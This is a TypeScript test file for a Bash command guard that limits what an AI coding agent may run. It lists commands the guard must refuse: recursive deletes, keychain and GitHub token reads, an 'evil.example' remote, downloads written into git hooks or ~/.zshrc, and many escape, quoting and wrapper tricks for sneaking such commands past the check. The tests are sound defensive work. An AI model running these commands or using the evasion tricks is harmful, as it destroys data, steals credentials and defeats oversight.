// The Bash guard against what the shell does to a command before it runs: patterns, tildes, escapes, quoting.
import test from 'node:test';
import * as assert from 'node:assert/strict';

import { guardBash } from '../src/core/guard';
import type { GuardContext } from '../src/core/guard';

const policy = { protectedBranches: ['main'], draftPrsOnly: true, forbidAiAttribution: true, allowNoVerify: false, sandbox: true, network: [], writable: [], checkEnv: [] };
/** An agent working in /ws/api, the root of its repository. */
const ctx = (extra: Partial<GuardContext> = {}): GuardContext => ({ policy, cwd: '/ws/api', workspace: '/ws', home: '/home/u', agent: true, task: { taskId: 'T', canPush: false }, writeRoots: ['/ws/api'], branchOf: async () => 'feat/x', isRepoRoot: async (d) => d === '/ws/api', readFile: async () => null, ...extra });
const allowed = async (command: string, c = ctx()): Promise<boolean> => (await guardBash(command, c)).allow;

test('guard: rm -r of a pattern is checked from the folder it starts in, and ~user is not your home', async () => {
  for (const command of ['rm -rf */', 'rm -rf ?*', 'rm -rf [a-z]*', 'rm -rf .[!.]* *', 'rm -rf src/*/../../*', 'rm -rf ~+', 'rm -rf ~u', 'rm -rf ~-/x', 'cd src && rm -rf ../*']) {
    assert.equal(await allowed(command), false, command);
  }
  for (const command of ['rm -rf build/*', 'rm -rf src/*/node_modules', 'rm -rf dist', 'rm -rf /tmp/cs-*', 'rm -rf ~/tmp-not-really']) {
    assert.equal(await allowed(command, ctx({ writeRoots: undefined })), command !== 'rm -rf ~/tmp-not-really', command);
  }
});

test('guard: no way into the keychain or a stored GitHub token', async () => {
  for (const command of [
    'security find-generic-password -s gh:github.com -w',
    'security -q find-generic-password -s gh:github.com -w',
    'echo "find-generic-password -s gh:github.com -w" | security -i',
    '/usr/bin/security dump-keychain',
    'printf "host=github.com\\n" | git-credential-osxkeychain get',
    'printf "protocol=https\\nhost=github.com\\n" | git credential fill',
    'gh auth status --show-token',
    'gh auth token',
    'gh pr view 1 --show-token',
  ]) {
    assert.equal(await allowed(command), false, command);
  }
  assert.equal(await allowed('gh pr view 12 --json title'), true);
});

test('guard: a command is read as the shell runs it, whatever escapes, quotes or wrappers spell it', async () => {
  for (const command of [
    '\\git push -f origin main',
    'g\\it push -f origin main',
    "$'\\x67it' push -f origin main",
    "echo $'\\'' ; git push -f origin main ; echo $'\\''",
    '{git,push,-f,origin,main}',
    'git {push,-f} origin main',
    'rm -rf {build,/}',
    'env -S "git push -f origin main"',
    'env --split-string="git commit -m x"',
    'time -p git push origin main',
    'watch -n 1 "git push origin main"',
    'flock /tmp/l git push origin main',
    'flock /tmp/l -c "git push origin main"',
    'script -q /dev/null git push origin main',
    'script -c "git push origin main" /tmp/out',
    'echo "git push -f origin main" | bash',
    'bash <<EOF\ngit push -f origin main\nEOF',
    'sh -s < cmds.txt',
    '$CMD push',
    '$(which git) push -f',
    'gi? push -f',
    'echo x &> .git/hooks/pre-commit',
    'echo x >| .git/hooks/pre-commit',
    'echo x >& .git/hooks/pre-commit',
    'echo x >&.git/hooks/pre-commit',
  ]) {
    assert.equal(await allowed(command), false, command);
  }
  for (const command of [
    'git status && git diff',
    'echo "a\\"b" > notes.txt',
    'ls 2>&1 | head',
    'npm test 2>&1 |& tee /tmp/log.txt',
    'find . -name "*.ts" -exec grep -l foo {} +',
    'git stash show -p stash@{0}',
    'echo {a,b}.txt',
    '[ -f package.json ] && npm test',
    '"/Users/A B/node_modules/.bin/eslint" src',
    'bash scripts/build.sh',
    'time npm test',
    "jq '.a' package.json",
  ]) {
    assert.equal(await allowed(command), true, command);
  }
  // A path with spaces in its folders is still the command its name says.
  assert.equal(await allowed('"/opt/x y/git" push -f origin main'), false);
});

test('guard: after a cd it cannot follow the folder is unknown, and a cd that may fail or ran in a subshell moves nothing after it', async () => {
  // rm -r is checked whatever the stage writes; with the sandbox off nothing else stops it.
  for (const command of [
    'cd $PWD/.. && rm -r app',
    'cd $(dirname $PWD) && rm -r app',
    'cd `dirname $PWD` && rm -r app',
    'cd - && rm -r app',
    'cd ~+ && rm -r app',
    'cd ~- && rm -r app',
    'popd && rm -r app',
    'pushd ~ && rm -r Documents',
    'cd api .. && rm -rf home/u',
    'CDPATH=/home/u cd Documents && rm -r x',
    'for i in 1 2 3; do cd ..; done && rm -rf home/u',
    'eval "cd /"; rm -rf home/u',
    '(cd /tmp/a/b); rm -rf ../..',
    '(cd /tmp/a/b && true) && rm -rf ../..',
    'echo $(cd /tmp/a/b); rm -rf ../..',
    'cd /tmp/a/b || rm -rf ../..',
    'cd /tmp/missing/b; rm -rf ../..',
    'cd /tmp/a/b | true; rm -rf ../..',
  ]) {
    assert.equal(await allowed(command, ctx({ writeRoots: undefined })), false, command);
  }
  for (const command of ['pushd .git && echo x > config', 'cd $X && echo x > .git/config', 'cd $X && echo x > a.txt', 'cd - && ln -s /home/u h']) {
    assert.equal(await allowed(command), false, command);
  }
  for (const command of [
    'cd src && rm -r build',
    'cd /ws/api/src && rm -rf build && cd .. && npm test',
    'cd src && cd .. && rm -rf dist',
    'cd packages/a && rm -rf ../../dist',
    'pushd src && npm test && popd && rm -rf dist',
    'cd /tmp/work && rm -rf build',
    'cd $X && npm test',
    'cd $X && git status > /tmp/status.txt',
  ]) {
    assert.equal(await allowed(command), true, command);
  }
});

test('guard: rm -r of what xargs or parallel read is refused, and find … -exec rm -r is checked like the folders it deletes', async () => {
  for (const command of [
    'ls | xargs rm -rf',
    'pwd | xargs rm -rf',
    'echo ~ | xargs rm -rf',
    'xargs -a list.txt rm -rf',
    'ls | xargs -I{} rm -rf {}',
    'ls | xargs -I% rm -rf build/%',
    'ls | xargs -i rm -rf build/{}',
    'pwd | xargs -I{} find {} -delete',
    "ls | xargs -I{} sh -c 'rm -rf {}'",
    'ls | parallel rm -rf',
    'find . -mindepth 1 -maxdepth 1 -exec rm -rf {} +',
    'find .. -exec rm -rf {} +',
    'find /home/u -execdir rm -r {} \\;',
    'find . -ok rm -rf {} \\;',
    'find . -name .git -exec rm -rf {} +',
    "find . -name '.*' -exec rm -rf {} +",
    'find . -mindepth 1 ! -name src -exec rm -rf {} +',
    'find .. -name api -exec rm -rf {} +',
    'find . -name config -delete',
    "find . -path '*/.git/*' -delete",
    'find . -type d -empty -delete',
  ]) {
    assert.equal(await allowed(command, ctx({ writeRoots: undefined })), false, command);
  }
  for (const command of [
    'rm -rf node_modules dist',
    'ls | xargs rm -f',
    'ls | xargs -n 1 echo',
    "find . -name '*.orig' | xargs rm -f",
    "grep -l foo -r src | xargs sed -i 's/foo/bar/'",
    "find dist -name '*.map' -delete",
    "find . -name '*.log' -delete",
    "find . -name '*.tmp' -exec rm {} +",
    'find . -name node_modules -type d -prune -exec rm -rf {} +',
    'find . -type d -name __pycache__ -exec rm -rf {} +',
    'find dist -exec rm -rf {} +',
  ]) {
    assert.equal(await allowed(command), true, command);
  }
});

test('guard: publishing is refused past the options before it, through the tools that run it, and for images and registry changes too', async () => {
  for (const command of [
    'npm pub',
    'npm -w pkg publish',
    'npm --workspace pkg publish',
    'npm --workspace=pkg publish',
    'npx npm publish',
    'npm exec -- npm publish',
    "npm exec -c 'npm publish'",
    'npm unpublish x@1 --force',
    'npm dist-tag add x@1 latest',
    'npm deprecate x@1 "use y"',
    'npm owner add bob x',
    'npm access public x',
    'pnpm --filter x publish',
    'pnpm dlx npm publish',
    'yarn workspace x npm publish',
    'corepack pnpm publish',
    'bunx npm publish',
    'python -m twine upload dist/*',
    'python3 -Im twine upload dist/*',
    'uvx twine upload dist/*',
    'pipx run twine upload dist/*',
    'uv publish',
    'cargo +nightly publish',
    'cargo yank --version 1.0.0',
    'poetry publish',
    'flit publish',
    'hatch publish',
    'gem push x.gem',
    'dotnet nuget push x.nupkg',
    'npx @vscode/vsce publish',
    'mvn deploy',
    './mvnw -B -DskipTests deploy',
    'mvn release:perform',
    './gradlew publish',
    'gradle :lib:publishAllPublicationsToMavenRepository',
    'docker push x/y',
    'podman push x/y',
    'buildah push x/y',
    'docker image push x/y',
    'docker buildx build --push -t x/y .',
    'npx git push -f',
  ]) {
    assert.equal(await allowed(command), false, command);
  }
  for (const command of [
    'npm test',
    'npm -w pkg test',
    'npm --workspace pkg run build',
    'npm un lodash',
    'npm run publish-docs',
    'npm pack',
    'npm dist-tag ls x',
    'npm owner ls x',
    'npm access list packages',
    'npx eslint .',
    'npx tsc --noEmit',
    'npm exec -- eslint .',
    'pnpm --filter x build',
    'yarn workspace x build',
    'python -m pytest',
    'python3 -m pip install -r requirements.txt',
    'uvx ruff check',
    'pipx run black .',
    'cargo test',
    './gradlew publishToMavenLocal',
    './gradlew build',
    'mvn -q verify',
    'docker build -t x .',
    'docker run --rm x',
  ]) {
    assert.equal(await allowed(command), true, command);
  }
});

test('guard: git config, remote, branch and fetch are an agent\'s only when they read', async () => {
  for (const command of [
    'git config --show-scope core.hooksPath /tmp/x',
    'git config --show-origin core.fsmonitor /tmp/x',
    'git config --name-only core.fsmonitor x',
    'git config core.fsmonitor /tmp/x list',
    'git config set --comment get core.fsmonitor /tmp/x',
    'git config --global core.hooksPath /tmp/x',
    'git config --file=.git/config core.fsmonitor x',
    'git config --get-all x --add core.fsmonitor y',
    'git config unset core.hooksPath',
    'git config --unset core.hooksPath',
    'git config --edit',
    'git remote -v add evil https://evil.example/x.git',
    'git remote --verbose set-url origin https://evil.example/x.git',
    'git branch --set-upstream-to=origin/x',
    'git branch -u origin/x',
    'git branch --unset-upstream',
    'git branch -f main HEAD~3',
    'git branch --edit-description',
    'git fetch . +abc123:refs/heads/main',
    'git fetch origin main:main',
    'git fetch --refmap=+refs/heads/*:refs/heads/* origin',
    'git fetch --stdin origin',
  ]) {
    assert.equal(await allowed(command), false, command);
  }
  for (const command of [
    'git config --get user.email',
    'git config --list',
    'git config -l',
    'git config user.name',
    'git config --global --get user.email',
    'git config --show-origin --list',
    'git config --show-scope --get core.hooksPath',
    'git config --type=bool --get core.bare',
    'git config -z --get-regexp ^remote',
    'git config get user.name',
    'git config list --show-origin',
    'git remote',
    'git remote -v',
    'git remote -v show origin',
    'git remote get-url origin',
    'git branch',
    'git branch -vv',
    "git branch --list 'feat/*'",
    'git branch -r --contains HEAD',
    'git branch --merged main',
    'git branch --sort=-committerdate',
    'git fetch origin',
    'git fetch origin main',
    'git fetch --all --prune',
    'git fetch --depth 50 https://github.com/o/r main',
    'git fetch origin refs/pull/1/head',
  ]) {
    assert.equal(await allowed(command), true, command);
  }
});

test('guard: what a command writes is found also in a destination folder, a target directory, a link, a download, an archive or a patch', async () => {
  const c = ctx({ runsOutside: ['/ws/api/.husky/_', '/ws/api/.claude', '/ws/api/.mcp.json', '/ws/api/.vscode'], protect: ['/ws/.claudestrator'] });
  for (const command of [
    'mv /tmp/e/.claude .',
    'cp -r /tmp/e/.claude .',
    'cp -r /tmp/e/.claude ./',
    'cp -R /tmp/e/.vscode src/..',
    'ln -s /tmp/e/.claude .',
    'ln -s x .claude',
    'cp x --target-directory=.git/hooks',
    'cp -t .git/hooks x',
    'cp -rt .git/hooks x',
    'mv x --target-directory=.git',
    'install -t .git/hooks x',
    'ln -s .. src/up && echo {} > src/up/.claude/settings.json',
    'ln -s ~ src/h && rm -r src/h/',
    'ln -s / src/root',
    'ln -s .husky h',
    'ln -s $X h',
    'curl -o .git/hooks/pre-commit https://x',
    'curl --output=.git/hooks/pre-commit https://x',
    'curl -sSLo .git/hooks/pre-commit https://x',
    'curl -O --output-dir .git/hooks https://x/pre-commit',
    'curl -O https://x/.mcp.json',
    'curl -OJ https://x/download',
    'wget -O ~/.zshrc https://x',
    'wget -qO ~/.zshrc https://x',
    'wget --output-document=/home/u/.zshrc https://x',
    'wget -P .git/hooks https://x/pre-commit',
    'wget -e output_document=/home/u/.zshrc https://x',
    'sort -o .git/config a',
    'sort --output=/home/u/.zshrc a',
    'tar -xf x.tar -C .git',
    'tar -xzf x.tgz --directory=.claude',
    'tar xf x.tar -P',
    'tar -czf /home/u/x.tgz src',
    'unzip x.zip -d .git/hooks',
    'patch .git/config p.diff',
    'patch -o /home/u/.zshrc a p.diff',
    'patch -d .git -p1 -i p.diff',
    'git apply --unsafe-paths p.diff',
    'git apply --directory=.git p.diff',
    'gzip .git/config',
  ]) {
    assert.equal(await allowed(command, c), false, command);
  }
  for (const command of [
    'mv a b',
    'cp a b',
    'cp -r src lib',
    'cp a.ts src/',
    'cp -r /tmp/e/src .',
    'ln -s src/a.ts b.ts',
    'ln -s ../shared/x.ts src/x.ts',
    'ln -s /tmp/cache .cache',
    'curl -o /tmp/x https://x',
    'curl -sSL https://x',
    'curl -o /dev/null -w "%{http_code}" https://x',
    'curl -O https://x/a.tgz',
    'wget -qO- https://x',
    'wget https://x/a.tgz',
    'sort -o sorted.txt a',
    'tar -xzf x.tgz -C build/',
    'tar -czf /tmp/x.tgz src',
    'tar -tf x.tgz',
    'unzip x.zip -d build',
    'patch -p1 < fix.diff',
    'git apply fix.patch',
    'gzip -c dist/x.js > /tmp/x.gz',
    'install -m 755 a bin/a',
    'rsync -a src/ build/',
  ]) {
    assert.equal(await allowed(command, c), true, command);
  }
});

test('guard: commands a shell reads from a here-string, a process substitution, a trap, a function or a wrapper are checked or refused', async () => {
  for (const command of [
    "sh <<< 'git commit -m x'",
    "bash <<<'git commit -m x'",
    "bash -s <<< 'git push -f'",
    "bash /dev/stdin <<< 'git commit -m x'",
    'bash <<<x\ngit push -f',
    'bash << EOF\ngit push -f\nEOF',
    "bash <(echo 'git commit -m x')",
    "source <(echo 'git commit -m x')",
    ". <(echo 'git commit -m x')",
    ". /dev/stdin <<< 'git commit -m x'",
    'source $(echo x)',
    "trap 'git commit -m x' EXIT",
    'trap -- "git push -f" EXIT',
    "alias g='git push -f'\ng",
    'f() { git push -f; }; f',
    'f () { git push -f; }',
    'function f { git push -f; }; f',
    'coproc git commit -m x',
    'coproc NAME { git push -f; }',
    'setsid git commit -m x',
    'ssh-agent git commit -m x',
    'strace -f git commit -m x',
    'ltrace git commit -m x',
    'fakeroot git commit -m x',
    'unbuffer git commit -m x',
    'chronic git commit -m x',
    'ionice -c3 git commit -m x',
    'taskset 1 git commit -m x',
    'caffeinate -i git commit -m x',
    'flock f git commit -m x',
    "flock -nc 'git commit -m x' /tmp/l",
    "script -qc 'git commit -m x' /dev/null",
    'direnv exec . git commit -m x',
    'sandbox-exec -f p.sb git push -f',
    "tmux new -d 'git commit -m x'",
    "tmux new-session -d -s s 'git commit -m x'",
    "tmux send-keys -t dev 'git push -f' Enter",
    "tmux -c 'git push -f'",
    'screen -dm git commit -m x',
    "screen -dmS s sh -c 'git commit -m x'",
    'parallel git commit -m ::: x',
    "parallel ::: 'git push -f'",
    "echo 'git push -f' | parallel",
    "at now <<< 'git commit -m x'",
    'crontab /tmp/cron',
    "tar -cf /dev/null x --checkpoint=1 --checkpoint-action=exec='git commit -m x'",
    "tar -xf x.tar --to-command='git push -f'",
  ]) {
    assert.equal(await allowed(command), false, command);
  }
  for (const command of [
    "bash <<< 'echo hi'",
    'bash scripts/build.sh <<< data',
    'cat <<< hello',
    'grep x <<< "$VAR"',
    'cat << EOF\nhello\nEOF',
    'diff <(sort a) <(sort b)',
    'while read l; do echo $l; done < <(ls)',
    'npm test > >(tee /tmp/log)',
    'source .venv/bin/activate && npm test',
    '. ./env.sh',
    "trap 'rm -f /tmp/x' EXIT",
    'trap - EXIT',
    "alias ll='ls -la'",
    'f() { echo hi; }; f',
    'tmux ls',
    "tmux new -d -s dev 'npm run dev'",
    'screen -ls',
    'screen -dmS dev npm run dev',
    'strace -f npm test',
    'flock /tmp/l npm test',
    'crontab -l',
    'parallel echo ::: a b',
  ]) {
    assert.equal(await allowed(command), true, command);
  }
});
